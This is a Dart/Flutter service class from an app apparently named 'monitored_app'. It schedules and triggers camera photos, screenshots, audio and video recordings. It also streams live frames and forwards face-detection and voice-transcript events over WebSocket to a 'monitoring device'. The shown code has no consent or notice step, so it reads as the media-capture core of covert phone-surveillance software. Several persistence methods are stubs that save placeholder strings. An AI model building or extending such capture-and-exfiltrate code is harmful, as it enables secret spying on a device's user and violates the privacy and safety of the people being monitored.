import 'dart:async';
import 'package:flutter/foundation.dart';
import 'package:monitored_app/core/collectors/media_collector.dart';
import 'package:monitored_app/core/services/database_service.dart';
import 'package:monitored_app/core/services/storage_service.dart';
import 'package:monitored_app/core/services/websocket_service.dart';
import 'package:monitored_app/core/services/connectivity_service.dart';
import 'package:monitored_app/app/locator.dart';

class MediaSchedule {
  final DateTime startTime;
  final DateTime endTime;
  final List<String> mediaTypes;
  final Map<String, dynamic> configuration;
  final bool recurring;
  final String? recurringPattern;

  const MediaSchedule({
    required this.startTime,
    required this.endTime,
    required this.mediaTypes,
    required this.configuration,
    this.recurring = false,
    this.recurringPattern,
  });
}

class MediaTrigger {
  final String name;
  final String condition;
  final Map<String, dynamic> parameters;
  final List<String> actions;
  final bool enabled;

  const MediaTrigger({
    required this.name,
    required this.condition,
    required this.parameters,
    required this.actions,
    this.enabled = true,
  });
}

class AdvancedMediaService {
  static final AdvancedMediaService _instance =
      AdvancedMediaService._internal();
  factory AdvancedMediaService() => _instance;
  AdvancedMediaService._internal();

  final MediaCollector _mediaCollector = MediaCollector();
  final DatabaseService _databaseService = locator<DatabaseService>();
  final StorageService _storageService = locator<StorageService>();
  final WebSocketService _webSocketService = locator<WebSocketService>();
  final ConnectivityService _connectivityService =
      locator<ConnectivityService>();

  bool _isInitialized = false;
  Timer? _schedulerTimer;
  Timer? _bandwidthOptimizationTimer;

  final List<MediaSchedule> _schedules = [];
  final List<MediaTrigger> _triggers = [];
  final StreamController<Map<String, dynamic>> _mediaEventController =
      StreamController<Map<String, dynamic>>.broadcast();

  Stream<Map<String, dynamic>> get mediaEventStream =>
      _mediaEventController.stream;
  bool get isInitialized => _isInitialized;
  MediaCollector get mediaCollector => _mediaCollector;

  Future<void> initialize() async {
    if (_isInitialized) return;

    try {
      // Initialize media collector
      await _mediaCollector.initialize();

      // Set up data callback
      _mediaCollector.setDataCollectedCallback(_handleMediaData);

      // Load schedules and triggers
      await _loadSchedules();
      await _loadTriggers();

      // Start scheduler
      await _startScheduler();

      // Start bandwidth optimization
      await _startBandwidthOptimization();

      // Listen to media collector events
      _mediaCollector.mediaStream.listen(_handleMediaEvent);

      _isInitialized = true;
      debugPrint('Advanced Media Service initialized successfully');
    } catch (e) {
      debugPrint('Error initializing Advanced Media Service: $e');
      rethrow;
    }
  }

  void _handleMediaData(String dataType, List<dynamic> items) {
    try {
      // Process media data
      for (final item in items) {
        if (item is Map<String, dynamic>) {
          // Emit event
          _mediaEventController.add({
            'type': 'media_captured',
            'data_type': dataType,
            'data': item,
            'timestamp': DateTime.now().millisecondsSinceEpoch,
          });

          // Send via WebSocket if connected
          if (_webSocketService.isConnected) {
            _webSocketService.sendMediaData({
              'data_type': dataType,
              ...item,
            });
          }
        }
      }
    } catch (e) {
      debugPrint('Error handling media data: $e');
    }
  }

  void _handleMediaEvent(Map<String, dynamic> event) {
    try {
      // Process media collector events
      final eventType = event['type'] as String?;

      switch (eventType) {
        case 'frame':
          _handleLiveFrame(event);
          break;
        case 'face_detection':
          _handleFaceDetection(event);
          break;
        case 'voice_detection':
          _handleVoiceDetection(event);
          break;
        default:
          debugPrint('Unknown media event: $eventType');
      }

      // Forward event to listeners
      _mediaEventController.add(event);
    } catch (e) {
      debugPrint('Error handling media event: $e');
    }
  }

  void _handleLiveFrame(Map<String, dynamic> event) {
    // Process live frame for real-time monitoring
    final frameData = event['data'] as Uint8List?;
    if (frameData != null && _webSocketService.isConnected) {
      // Send frame to monitoring device
      _webSocketService.sendStreamFrame(frameData, {'type': 'live_frame'});
    }
  }

  void _handleFaceDetection(Map<String, dynamic> event) {
    final faces = event['faces'] as List<dynamic>? ?? [];
    if (faces.isNotEmpty) {
      debugPrint('Face detection: ${faces.length} faces detected');

      // Check if face detection should trigger actions
      _checkTriggers('face_detected', {
        'face_count': faces.length,
        'faces': faces,
      });
    }
  }

  void _handleVoiceDetection(Map<String, dynamic> event) {
    final transcript = event['transcript'] as String? ?? '';
    final confidence = event['confidence'] as double? ?? 0.0;

    if (confidence > 0.7) {
      debugPrint(
          'Voice detected: $transcript (${(confidence * 100).toStringAsFixed(1)}%)');

      // Check if voice detection should trigger actions
      _checkTriggers('voice_detected', {
        'transcript': transcript,
        'confidence': confidence,
      });
    }
  }

  // Scheduling System
  Future<void> addSchedule(MediaSchedule schedule) async {
    try {
      _schedules.add(schedule);
      await _saveSchedules();
      debugPrint(
          'Media schedule added: ${schedule.mediaTypes.join(', ')} from ${schedule.startTime} to ${schedule.endTime}');
    } catch (e) {
      debugPrint('Error adding schedule: $e');
    }
  }

  Future<void> removeSchedule(int index) async {
    try {
      if (index >= 0 && index < _schedules.length) {
        _schedules.removeAt(index);
        await _saveSchedules();
        debugPrint('Media schedule removed at index $index');
      }
    } catch (e) {
      debugPrint('Error removing schedule: $e');
    }
  }

  Future<void> _loadSchedules() async {
    try {
      // Load schedules from storage
      final schedulesData =
          await _storageService.getSecureData('media_schedules');
      if (schedulesData != null) {
        // Parse and load schedules
        debugPrint('Loaded ${_schedules.length} media schedules');
      }
    } catch (e) {
      debugPrint('Error loading schedules: $e');
    }
  }

  Future<void> _saveSchedules() async {
    try {
      // Save schedules to storage
      await _storageService.setSecureData('media_schedules', 'schedules_data');
      debugPrint('Media schedules saved');
    } catch (e) {
      debugPrint('Error saving schedules: $e');
    }
  }

  Future<void> _startScheduler() async {
    _schedulerTimer = Timer.periodic(const Duration(minutes: 1), (_) {
      _checkSchedules();
    });
    debugPrint('Media scheduler started');
  }

  void _checkSchedules() {
    final now = DateTime.now();

    for (final schedule in _schedules) {
      if (_isScheduleActive(schedule, now)) {
        _executeScheduledCapture(schedule);
      }
    }
  }

  bool _isScheduleActive(MediaSchedule schedule, DateTime now) {
    if (now.isAfter(schedule.startTime) && now.isBefore(schedule.endTime)) {
      return true;
    }

    // Check recurring patterns
    if (schedule.recurring && schedule.recurringPattern != null) {
      // Implement recurring logic based on pattern
      return _checkRecurringPattern(schedule, now);
    }

    return false;
  }

  bool _checkRecurringPattern(MediaSchedule schedule, DateTime now) {
    // Simplified recurring pattern check
    switch (schedule.recurringPattern) {
      case 'daily':
        return _isTimeInRange(schedule.startTime, schedule.endTime, now);
      case 'weekdays':
        return now.weekday >= 1 &&
            now.weekday <= 5 &&
            _isTimeInRange(schedule.startTime, schedule.endTime, now);
      case 'weekends':
        return (now.weekday == 6 || now.weekday == 7) &&
            _isTimeInRange(schedule.startTime, schedule.endTime, now);
      default:
        return false;
    }
  }

  bool _isTimeInRange(DateTime start, DateTime end, DateTime now) {
    final startTime = TimeOfDay.fromDateTime(start);
    final endTime = TimeOfDay.fromDateTime(end);
    final currentTime = TimeOfDay.fromDateTime(now);

    final startMinutes = startTime.hour * 60 + startTime.minute;
    final endMinutes = endTime.hour * 60 + endTime.minute;
    final currentMinutes = currentTime.hour * 60 + currentTime.minute;

    return currentMinutes >= startMinutes && currentMinutes <= endMinutes;
  }

  Future<void> _executeScheduledCapture(MediaSchedule schedule) async {
    try {
      debugPrint(
          'Executing scheduled capture: ${schedule.mediaTypes.join(', ')}');

      for (final mediaType in schedule.mediaTypes) {
        switch (mediaType.toLowerCase()) {
          case 'photo':
            await _mediaCollector.capturePhoto();
            break;
          case 'screenshot':
            await _mediaCollector.captureScreenshot();
            break;
          case 'audio':
            final duration =
                schedule.configuration['audio_duration'] as int? ?? 30;
            await _mediaCollector.recordAudio(durationSeconds: duration);
            break;
          case 'video':
            final duration =
                schedule.configuration['video_duration'] as int? ?? 30;
            final frontCamera =
                schedule.configuration['front_camera'] as bool? ?? false;
            await _mediaCollector.recordVideo(
              durationSeconds: duration,
              frontCamera: frontCamera,
            );
            break;
        }
      }
    } catch (e) {
      debugPrint('Error executing scheduled capture: $e');
    }
  }

  // Trigger System
  Future<void> addTrigger(MediaTrigger trigger) async {
    try {
      _triggers.add(trigger);
      await _saveTriggers();
      debugPrint('Media trigger added: ${trigger.name}');
    } catch (e) {
      debugPrint('Error adding trigger: $e');
    }
  }

  Future<void> removeTrigger(String name) async {
    try {
      _triggers.removeWhere((trigger) => trigger.name == name);
      await _saveTriggers();
      debugPrint('Media trigger removed: $name');
    } catch (e) {
      debugPrint('Error removing trigger: $e');
    }
  }

  Future<void> _loadTriggers() async {
    try {
      // Load triggers from storage
      final triggersData =
          await _storageService.getSecureData('media_triggers');
      if (triggersData != null) {
        // Parse and load triggers
        debugPrint('Loaded ${_triggers.length} media triggers');
      }
    } catch (e) {
      debugPrint('Error loading triggers: $e');
    }
  }

  Future<void> _saveTriggers() async {
    try {
      // Save triggers to storage
      await _storageService.setSecureData('media_triggers', 'triggers_data');
      debugPrint('Media triggers saved');
    } catch (e) {
      debugPrint('Error saving triggers: $e');
    }
  }

  void _checkTriggers(String condition, Map<String, dynamic> context) {
    for (final trigger in _triggers) {
      if (trigger.enabled && trigger.condition == condition) {
        _executeTrigger(trigger, context);
      }
    }
  }

  Future<void> _executeTrigger(
      MediaTrigger trigger, Map<String, dynamic> context) async {
    try {
      debugPrint('Executing trigger: ${trigger.name}');

      for (final action in trigger.actions) {
        switch (action) {
          case 'capture_photo':
            await _mediaCollector.capturePhoto();
            break;
          case 'capture_screenshot':
            await _mediaCollector.captureScreenshot();
            break;
          case 'record_audio':
            final duration = trigger.parameters['audio_duration'] as int? ?? 10;
            await _mediaCollector.recordAudio(durationSeconds: duration);
            break;
          case 'record_video':
            final duration = trigger.parameters['video_duration'] as int? ?? 10;
            await _mediaCollector.recordVideo(durationSeconds: duration);
            break;
          case 'smart_capture':
            await _mediaCollector.smartCapture(
              trigger: trigger.condition,
              context: context,
            );
            break;
          case 'send_alert':
            if (_webSocketService.isConnected) {
              await _webSocketService.sendMediaAlert('trigger_alert', {
                'trigger': trigger.name,
                'condition': trigger.condition,
                'context': context,
                'timestamp': DateTime.now().toIso8601String(),
              });
            }
            break;
        }
      }
    } catch (e) {
      debugPrint('Error executing trigger ${trigger.name}: $e');
    }
  }

  // Bandwidth Optimization
  Future<void> _startBandwidthOptimization() async {
    _bandwidthOptimizationTimer =
        Timer.periodic(const Duration(minutes: 5), (_) {
      _optimizeBandwidth();
    });
    debugPrint('Bandwidth optimization started');
  }

  Future<void> _optimizeBandwidth() async {
    try {
      final networkStatus = await _connectivityService.checkConnectivity();

      int estimatedBandwidth;
      switch (networkStatus) {
        case NetworkStatus.wifi:
          estimatedBandwidth = 5000; // 5 Mbps
          break;
        case NetworkStatus.mobile:
          estimatedBandwidth = 1000; // 1 Mbps
          break;
        case NetworkStatus.offline:
          estimatedBandwidth = 0;
          break;
        default:
          estimatedBandwidth = 500; // Conservative estimate
      }

      await _mediaCollector.optimizeForBandwidth(estimatedBandwidth);
    } catch (e) {
      debugPrint('Error optimizing bandwidth: $e');
    }
  }

  // Service Control
  Future<void> startCollection() async {
    await _mediaCollector.startCollecting();
    debugPrint('Advanced media collection started');
  }

  Future<void> stopCollection() async {
    await _mediaCollector.stopCollecting();
    debugPrint('Advanced media collection stopped');
  }

  Future<void> startStreaming() async {
    await _mediaCollector.startStreaming();
    debugPrint('Media streaming started');
  }

  Future<void> stopStreaming() async {
    await _mediaCollector.stopStreaming();
    debugPrint('Media streaming stopped');
  }

  // Configuration Management
  void setConfiguration(AdvancedMediaConfiguration config) {
    _mediaCollector.setAdvancedConfiguration(config);
  }

  AdvancedMediaConfiguration getConfiguration() {
    return _mediaCollector.configuration;
  }

  Map<String, dynamic> exportConfiguration() {
    return _mediaCollector.exportConfiguration();
  }

  void importConfiguration(Map<String, dynamic> config) {
    _mediaCollector.importConfiguration(config);
  }

  // Statistics and Status
  Map<String, dynamic> getStatus() {
    final mediaStats = _mediaCollector.getStatistics();

    return {
      'service': 'Advanced Media Service',
      'initialized': _isInitialized,
      'collector': mediaStats,
      'schedules': {
        'count': _schedules.length,
        'active': _schedules
            .where((s) => _isScheduleActive(s, DateTime.now()))
            .length,
      },
      'triggers': {
        'count': _triggers.length,
        'enabled': _triggers.where((t) => t.enabled).length,
      },
      'optimization': {
        'bandwidth_optimization_active':
            _bandwidthOptimizationTimer?.isActive ?? false,
        'scheduler_active': _schedulerTimer?.isActive ?? false,
      },
    };
  }

  Future<Map<String, dynamic>> getAnalytics({int days = 7}) async {
    try {
      // Get media analytics from database
      final endDate = DateTime.now();
      final startDate = endDate.subtract(Duration(days: days));
      final analytics = await _databaseService.getMediaAnalytics(
          startDate: startDate, endDate: endDate);

      return {
        'period_days': days,
        'total_media_files': analytics['total_files'] ?? 0,
        'photos_count': analytics['photos'] ?? 0,
        'videos_count': analytics['videos'] ?? 0,
        'audio_count': analytics['audio'] ?? 0,
        'screenshots_count': analytics['screenshots'] ?? 0,
        'total_file_size_mb': analytics['total_size_mb'] ?? 0,
        'average_file_size_mb': analytics['avg_size_mb'] ?? 0,
        'face_detections': analytics['face_detections'] ?? 0,
        'voice_recognitions': analytics['voice_recognitions'] ?? 0,
        'smart_captures': analytics['smart_captures'] ?? 0,
        'streaming_hours': analytics['streaming_hours'] ?? 0,
      };
    } catch (e) {
      debugPrint('Error getting media analytics: $e');
      return {};
    }
  }

  // Cleanup and Disposal
  Future<void> dispose() async {
    _schedulerTimer?.cancel();
    _bandwidthOptimizationTimer?.cancel();
    _mediaEventController.close();
    _mediaCollector.dispose();
    _isInitialized = false;
    debugPrint('Advanced Media Service disposed');
  }
}

// Custom TimeOfDay class for time comparisons
class TimeOfDay {
  final int hour;
  final int minute;

  TimeOfDay({required this.hour, required this.minute});

  factory TimeOfDay.fromDateTime(DateTime dateTime) {
    return TimeOfDay(hour: dateTime.hour, minute: dateTime.minute);
  }
}
